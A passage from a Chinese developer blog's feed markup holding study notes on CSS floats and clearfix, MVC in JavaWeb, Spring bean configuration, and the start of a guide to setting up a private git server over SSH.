data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154153563.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719154153563" style="zoom:67%;"><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154210682.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154210682.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719154210682"></p><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154455827.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154455827.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719154455827" style="zoom:67%;"><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154502053.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154502053.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719154502053"></p><p><code>nth of type(n)</code>是在相同元素中找到第n个元素</p><h2 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h2><p>一般页面中的非主题内容可以使用伪元素，伪元素必加的属性是content，而对伪元素如果要设置高宽就要将其改为块级元素</p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719155210795.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719155210795.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719155210795" style="zoom:67%;"><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720154301508.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720154301508.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720154301508"><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720154311410.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720154311410.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720154311410"></p><h2 id="浮动-1"><a href="#浮动-1" class="headerlink" title="浮动"></a>浮动</h2><p>属性：float:left、right</p><p>浮动特点：</p><ol><li><p>浮动元素会脱离标准流，在标准流中不占位置</p></li><li><p>浮动元素比标准流高半个级别，可以覆盖标准流中的元素</p></li><li><p>浮动找浮动，下一个浮动元素会在上一个浮动元素后面左右浮动</p></li><li><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720160236185.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720160236185.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720160236185" style="zoom:67%;"><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720160246296.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720160246296.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720160246296" style="zoom:50%;"></p><p>元素都往右浮动，下一个元素会以上一个元素为基准进行浮动</p></li><li><p>浮动元素会受到上面元素边界的影响，如果上面元素标准流已经占满一行，则此时的浮动元素会在本行中进行浮动</p></li><li><p>浮动元素的特殊效果：一行可以显示多个；<strong>可以设置宽高</strong></p></li></ol><p><strong>浮动的元素不能通过<code>text-align:center</code>或者<code>margin:0 auto</code>，让浮动本身元素水平居中</strong></p><p>将行内元素变成能设置宽高</p><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720170116977.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720170116977.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720170116977"></p><h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><p>如果子元素浮动了，此时<strong>子元素不能撑开标准流</strong>的块级父元素；子元素浮动后脱标就是不占位置，需要父元素有高度，从而不影响其他网页元素的布局</p><p><strong>清除浮动的方法</strong></p><ol><li>直接给父元素设置高度</li><li>额外标签法：在父元素内容最后添加一个块级元素；给添加的块级元素设置<code>clear：both</code><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720172325371.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720172325371.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720172325371" style="zoom:50%;"></li><li>单伪元素清除法<img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720172416446.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720172416446.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720172416446" style="zoom:50%;"></li><li>双伪元素清除法<img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720173105014.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720173105014.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720173105014" style="zoom:50%;"></li><li>给父元素设置<code>overflow:hidden</code></li></ol><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720173541355.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720173541355.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720173541355" style="zoom:67%;"><h1 id="BFC块格式化上下文"><a href="#BFC块格式化上下文" class="headerlink" title="BFC块格式化上下文"></a>BFC块格式化上下文</h1><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720173723663.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210720173723663.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210720173723663"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MVC-开发</title>
      <link href="/2021/10/05/JavaWeb/MVC-%E5%BC%80%E5%8F%91/"/>
      <url>/2021/10/05/JavaWeb/MVC-%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/05/JavaWeb/MVC-%E5%BC%80%E5%8F%91/image-20211005100430776.png" class="lazyload" data-srcset="/2021/10/05/JavaWeb/MVC-%E5%BC%80%E5%8F%91/image-20211005100430776.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211005100430776"></p><p>上面模型有一定问题，控制层为UserServlet继承自HttpServlet，若当成简单的逻辑控制程序，则不太方便，所以要设计一个只有单纯但处理请求的控制层，返回返回的对象为Model和View，而不是强迫继承Servlet</p><p><img src="/2021/10/05/JavaWeb/MVC-%E5%BC%80%E5%8F%91/image-20211005101401512.png" class="lazyload" data-srcset="/2021/10/05/JavaWeb/MVC-%E5%BC%80%E5%8F%91/image-20211005101401512.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211005101401512"></p><p>其中view为一个路径，比如需要渲染的jsp文件路径，model为处理完返回的对象</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring初识</title>
      <link href="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/"/>
      <url>/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="控制翻转IOC"><a href="#控制翻转IOC" class="headerlink" title="控制翻转IOC"></a>控制翻转IOC</h1><p>spring框架</p><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211001092714665.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211001092714665.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211001092714665" style="zoom:67%;"><h2 id="Spring-Bean"><a href="#Spring-Bean" class="headerlink" title="Spring Bean"></a>Spring Bean</h2><p>注册 Spring Bean 实际上是将 BeanDefinition 注册到 IoC 容器中。</p><p><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211001113858179.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211001113858179.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211001113858179"></p><p>（一）XML 配置元信息</p><p>Spring 的传统配置方式。在 <code>&lt;bean&gt;</code> 标签中配置元数据内容。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;teacher_wang&quot;</span> <span class="attr">class</span>=<span class="string">&quot;teacher.Teacher&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;wangxiaoming&quot;</span> <span class="attr">p:sex</span>=<span class="string">&quot;男&quot;</span> <span class="attr">p:salary</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        设置别名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;teacher_wang&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;teacher_yuwen&quot;</span>/&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>缺点是当 JavaBean 过多时，产生的配置文件足以让你眼花缭乱。</p><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012203040235.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012203040235.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012203040235" style="zoom: 50%;"><p>（二）注解配置元信息</p><p>使用 <code>@Bean</code>、<code>@Component</code>、<code>@Import</code> 注解注册 Spring Bean。</p><p>（三）Java API 配置元信息</p><ul><li>命名方式：<code>BeanDefinitionRegistry#registerBeanDefinition(String,BeanDefinition)</code></li><li>非命名方式：<code>BeanDefinitionReaderUtils#registerWithGeneratedName(AbstractBeanDefinition,Be</code> <code>anDefinitionRegistry)</code></li><li>配置类方式：<code>AnnotatedBeanDefinitionReader#register(Class...)</code></li></ul><h1 id="Bean范围"><a href="#Bean范围" class="headerlink" title="Bean范围"></a>Bean范围</h1><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012203500846.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012203500846.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012203500846" style="zoom:50%;"><p>prototype每次get都会产生一个新的对象</p><h1 id="Bean的自动装配"><a href="#Bean的自动装配" class="headerlink" title="Bean的自动装配"></a>Bean的自动装配</h1><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012204323430.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012204323430.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012204323430" style="zoom:50%;"><h1 id="通过注解实现自动装配"><a href="#通过注解实现自动装配" class="headerlink" title="通过注解实现自动装配"></a>通过注解实现自动装配</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012205141763.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012205141763.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012205141763" style="zoom:50%;"><h2 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h2><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012210833305.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012210833305.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012210833305" style="zoom:50%;"><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012211733999.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012211733999.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012211733999" style="zoom:67%;"><h2 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h2><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012213239162.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012213239162.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012213239162" style="zoom:50%;"><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012213257660.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012213257660.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012213257660" style="zoom:50%;"><p>@Scope也相似可以设置模式</p><h1 id="使用java配置类"><a href="#使用java配置类" class="headerlink" title="使用java配置类"></a>使用java配置类</h1><p>controller类</p><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012215324585.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012215324585.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012215324585" style="zoom:50%;"><p>appconfig类</p><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012215359551.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012215359551.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012215359551" style="zoom:50%;"><p>测试类</p><img src="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012215414472.png" class="lazyload" data-srcset="/2021/10/01/Spring/Spring%E5%88%9D%E8%AF%86/image-20211012215414472.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012215414472" style="zoom:67%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>自建gitlab</title>
      <link href="/2021/07/30/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E8%87%AA%E5%BB%BAgitlab/"/>
      <url>/2021/07/30/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E8%87%AA%E5%BB%BAgitlab/</url>
      
        <content type="html"><![CDATA[<h1 id="使用git搭建自己私有个人仓库"><a href="#使用git搭建自己私有个人仓库" class="headerlink" title="使用git搭建自己私有个人仓库"></a>使用git搭建自己私有个人仓库</h1><p>服务端、客户端：安装openssh以及git</p><p>服务端：添加一个新的用户git</p><p>服务端：添加git的ssh访问，git的home目录中添加一个.ssh目录，存放要登录的公钥到authorized_keys</p><p>客户端：使用<code>ssh-keygen -t rsa</code>生成公私钥并且将公钥添加在服务端的authorized_keys</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 切换用户</span></span><br><span class="line">su git</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入用户主目录</span></span><br><span class="line">cd /home/git</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建.ssh配置目录，如果有此文件夹，跳过此步</span></span><br><span class="line">mkdir .ssh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 